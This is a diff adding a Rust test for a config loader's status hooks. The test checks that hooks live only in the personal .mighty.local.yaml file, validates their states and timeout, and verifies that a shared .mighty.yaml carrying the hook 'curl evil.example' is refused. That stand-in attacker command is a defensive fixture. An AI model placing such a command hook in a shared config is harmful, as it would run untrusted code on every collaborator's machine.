@@ -445,3 +445,44 @@ fn the_new_keys_change_the_content_hash_and_a_file_without_them_keeps_its_hash()
     assert!(!merged.run["e2e"].concurrent);
     support::place::remove_folder(&folder);
 }
+
+/// MC-9: a status hook lives in `.mighty.local.yaml` only, its states checked, and a file without it keeps its hash.
+#[test]
+fn a_status_hook_is_personal_and_its_states_are_checked() {
+    let folder = support::place::temp("mighty-yaml-hooks");
+    std::fs::write(folder.join(".mighty.yaml"), "version: 1\nworktree:\n  setup: npm ci\n").unwrap();
+    let before = load_from_folder(&folder).unwrap().unwrap().content_hash;
+    let json = serde_json::to_string(&parse_config("version: 1\n").unwrap()).unwrap();
+    assert!(!json.contains("hooks"), "{json}");
+
+    std::fs::write(
+        folder.join(".mighty.local.yaml"),
+        "hooks:\n  command: ./notify.sh \"$MIGHTY_STATE\"\n  on: [failed, done]\n  timeoutSeconds: 5\n",
+    )
+    .unwrap();
+    let loaded = load_from_folder(&folder).unwrap().unwrap();
+    assert_ne!(loaded.content_hash, before, "a hook asks for approval again");
+    let hooks = &loaded.config.hooks;
+    assert_eq!(hooks.command.as_deref(), Some("./notify.sh \"$MIGHTY_STATE\""));
+    assert_eq!(hooks.on, vec!["done".to_string(), "failed".to_string()], "in the states' own order");
+    assert_eq!(hooks.timeout(), std::time::Duration::from_secs(5));
+    assert_eq!(parse_config("hooks:\n  command: say hi\n").unwrap().hooks.events(), vec!["blocked", "done", "failed"]);
+    assert_eq!(parse_config("hooks:\n  on: started, stopped\n").unwrap().hooks.on, vec!["started", "stopped"]);
+
+    for bad in [
+        "hooks:\n  on: [finished]\n",
+        "hooks:\n  timeoutSeconds: 0\n",
+        "hooks:\n  timeoutSeconds: 301\n",
+        "hooks:\n  shell: bash\n",
+        "hooks: [a]\n",
+    ] {
+        assert!(parse_config(bad).is_err(), "{bad}");
+    }
+
+    // The shared file may not carry one: it would run a command on every clone's computer.
+    std::fs::remove_file(folder.join(".mighty.local.yaml")).unwrap();
+    std::fs::write(folder.join(".mighty.yaml"), "hooks:\n  command: curl evil.example\n").unwrap();
+    let refused = load_from_folder(&folder).unwrap_err();
+    assert!(refused.contains(".mighty.local.yaml"), "{refused}");
+    support::place::remove_folder(&folder);
+}
